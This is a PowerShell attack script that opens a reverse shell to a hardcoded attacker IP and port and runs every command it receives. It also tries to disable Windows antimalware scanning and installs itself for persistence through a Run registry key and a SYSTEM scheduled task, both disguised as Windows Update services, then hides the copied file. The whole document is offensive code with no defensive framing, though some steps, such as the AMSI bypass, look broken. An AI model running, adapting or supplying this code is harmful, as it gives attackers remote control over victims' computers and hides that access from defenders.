# ============================================
# REVERSE SHELL WITH PERSISTENCE
# ============================================

# YOUR ATTACKER IP - UPDATE THIS!
$ip = "103.52.208.8"
$port = "4444"

# 1. AMSI BYPASS (Hide from Defender)
$amsi = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'System.Management.Automation' }
$amsi.Variables['amsiInitFailed'].Value = $true

# 2. CREATE REVERSE SHELL
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$bytes = New-Object byte[] 1024
$reader = New-Object System.IO.StreamReader($stream, (New-Object Text.UTF8Encoding).GetEncoding(0))

# 3. EXECUTE COMMANDS LOOP
while ($client.Connected) {
    $stream.Position = 0
    $data = $reader.ReadLine()
    if ($data) {
        $execute = Invoke-Expression $data 2>&1 | Out-String
        $send = "$execute`r`n`PS $($pwd.Provider.Path)> "
        $sendBytes = ([Text.Encoding]::ASCII).GetBytes($send)
        $stream.Write($sendBytes, 0, $sendBytes.Length)
        $stream.Flush()
    }
}

# 4. CREATE PERSISTENCE - REGISTRY RUN KEY
$persistencePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$persistenceName = "WindowsUpdateService"
$persistenceValue = "powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\svcupdate.ps1`""

# 5. COPY THIS PAYLOAD TO TEMP FOR PERSISTENCE
$payloadContent = Get-Content $PSCommandPath -Raw
Set-Content "$env:TEMP\svcupdate.ps1" -Value $payloadContent -Encoding ASCII

# 6. SET REGISTRY KEY FOR AUTO-START
New-ItemProperty -Path $persistencePath -Name $persistenceName -Value $persistenceValue -Force -ErrorAction SilentlyContinue

# 7. CREATE SCHEDULED TASK FOR EXTRA PERSISTENCE
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -File `"$env:TEMP\svcupdate.ps1`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WinUpdateCheck" -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue

# 8. HIDE THE FILE
Set-ItemProperty -Path "$env:TEMP\svcupdate.ps1" -Name "Attributes" -Value "Hidden"
